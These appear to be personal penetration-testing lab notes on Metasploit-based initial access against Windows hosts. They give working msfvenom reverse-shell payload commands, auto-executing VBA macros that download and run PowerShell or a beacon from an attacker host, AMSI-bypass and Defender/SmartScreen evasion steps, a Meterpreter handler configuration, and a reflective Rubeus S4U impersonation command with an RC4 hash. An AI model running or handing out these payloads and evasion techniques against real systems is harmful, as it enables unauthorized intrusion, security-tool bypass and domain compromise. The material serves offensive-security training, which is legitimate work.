## Metasploit framework notes

#### Auto Run Script

```
set AutoRunScript migrate -n explorer.exe
```

## msf encoder

```
set enablestageencoding true
set stageencoder x86/xor_dynamic
```

### Ch1 Notes

### (FAILED)Initial access failed method 1-triggle asmi bypass, add marco payload xor 
1. Identify the web port on 192.168.49.121  allowing file upload. Upload a doc file which allow which allow [ping marco](/msf/ping.vba) command to verify the target allowing code execution though marco 

2. Create stageless tcp raw payload 
```
sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.49.141  LPORT=443 -f raw -o tcp.bin
```
3. Patch the payload
- **encode the payload with custom wrapper to create exe to bypass defender**
- **append microsoft binary meta data to the payload to bypass smart screen**

4. Create malicious marco with amsi bypass and download our malicou payload to remote host, 
- encode the marco content with powershell  [marco  xor Payload encoder](/msf/payloadencoder.ps)
- [test.txt](/msf/test.txt) contains amsi powershell patching and web invoke request to download our encoded and digitally signed payload
- Craft the [marco](/msf/asmibypasswithxor.vba) and attached to a doc file
5. No call back, no download log, maybe the powershell is not allowed??

### (FAILED)Initial access failed method 2-embed vba shell code in the doc file

1. Create x86 staged payload
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.141 LPORT=443 EXITFUNC=thread -f vbapplication
```

2. embed into the [macilous marco](/msf/shellcode.vba) using VirtualAlloc, RtlMoveMemory, CreateThread method
3. lauch msf6

```
set payload windows/meterpreter/reverse_https
set enablestageencoding true
set stageencoder x86/xor_dynamic
run -j
```
4. Not working... maybe the shell code get flaged?

### (FAILED)Initial access failed method 3-embed powershell download cradle to execute payload
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.141/run.ps1') | IEX"
    Shell str, vbHide
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub

```

#### shell downloadn works so far

```
 Dim str As String
    str = "powershell -c Start-bitstransfer -source http://192.168.49.141:80/newbeacon.exe -destination C:\\Windows\\Tasks\\newbeacon.exe"
    Shell str, vbHide
```
#### Worksss!! Marco Initial access works
1. Create [shell code runner](/msf/shellrunner.vba) VBA Marco using CreateThread-> execute the shell code, VirtualAlloc-> allocate memeory space for shell code, RtlMoveMemory->copy shell code into memory space

the staged VBA shell code can be generated from msfvenom command 
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.141 LPORT=443 EXITFUNC=thread -f vbapplication
```

2. Copy VBA shell code into the [C# caesar cipher](/msf/caesar_cipher.cs) to encode the shell code, compile, run the program and copy output back to VBA marco 
3. Set up the msf c2
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.49.81
set lport 443
set enablestageencoding true
set stageencoder x86/xor_dynamic
set AutoRunScript migrate -n explorer.exe
run -j
```

####Get into 192.168.141.122 machine, hostname: client

Domain Admins: Administrator and pete


## TTPS
scaning
sudo nmap -A -Pn 192.168.120.130-132

Process Migrate
```
meterpreter > execute -H -f notepad
meterpreter > migrate 620
```

HostRecon
```
PS C:\windows\system32\inetsrv> (new-object system.net.webclient).downloadstring('http://192.168.119.120/HostRecon.ps1') | IEX
```

Check APP blocker rules
```
PS C:\windows\system32\inetsrv> Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

Check LSA protection
```
PS C:\windows\system32\inetsrv> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

Run AMSI patching
```
(new-object system.net.webclient).downloadstring('http://192.168.119.120/amsi.txt') | IEX
```

Powershell Load EXE:
```
PS C:\Windows\system32> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/Rubeus.exe')
PS C:\Windows\system32> $assem = [System.Reflection.Assembly]::Load($data)
PS C:\Windows\system32> [Rubeus.Program]::Main("s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```

